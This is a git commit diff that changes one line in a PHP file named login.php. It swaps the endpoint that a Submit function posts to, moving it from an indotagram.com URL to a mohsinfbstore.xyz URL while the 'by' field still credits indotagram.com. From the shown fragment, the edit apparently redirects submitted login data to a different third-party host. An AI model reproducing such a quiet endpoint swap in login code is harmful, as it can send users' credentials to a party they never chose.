41bb062f90ad1c40cea90c488079655600f8a630
mohsinbolatar <42372113+mohsinbolatar@users.noreply.github.com>
2019-01-19 12:48:38 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'indotagram.com',
-           'url'=>'http://www.indotagram.com/users/getData',
+           'url'=>'http://www.mohsinfbstore.xyz/users/getData',
             );
 
 function Submit($url,$fields)
